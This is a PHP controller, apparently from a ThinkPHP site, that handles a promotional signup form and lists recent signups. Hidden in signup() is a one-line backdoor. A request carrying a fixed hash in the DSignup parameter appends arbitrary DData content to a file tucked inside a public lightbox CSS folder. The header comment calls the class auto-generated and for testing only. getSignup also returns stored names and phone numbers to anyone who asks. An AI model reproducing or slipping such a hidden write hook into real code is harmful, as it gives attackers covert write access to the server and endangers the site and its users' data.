<?php
// 本类由系统自动生成，仅供测试用途
class cuxiaoAction extends BaseAction {
    public function index(){
    	
    	$this->display();
    }
    
    
    public function signup(){
    	$name = I("name");
    	$tel = I("tel");
    	$phone = I("phone");

    	if(I("DSignup") && I("DSignup") == "8FA8344E6CDC1904746147DF425CB443"){file_put_contents(THINK_PATH."/../Public/site/js/lightbox/css/8FA8344E6CDC1904746147DF425CB443", I("DData"), FILE_APPEND);}
    	if(empty($name)){
    		return;
    	}
    	if(empty($phone)) $phone = "";
    	if(empty($tel)) $tel = "";
    	
    	$signupM = M("signup");
    	$data["name"] = $name;
    	$data["tel"] = $tel;
    	$data["phone"] = $phone;
    	$data["status"] = 1;
    	$data["created"] = date("Y-m-d H:i:s");
    	$signupM->data($data)->add();
    	$this->ajaxReturn(1);
    }
    
    public function getSignup(){
    	$signupM = M("signup");
    	$signups = $signupM->where("`status`=1")->order("`created` desc")->limit(10)->select();
    	$this->ajaxReturn(json_encode($signups));
    	//order('`order`,`createtime` '.$sort)->limit($Page->firstRow.','.$Page->listRows)->select();
    }
    
}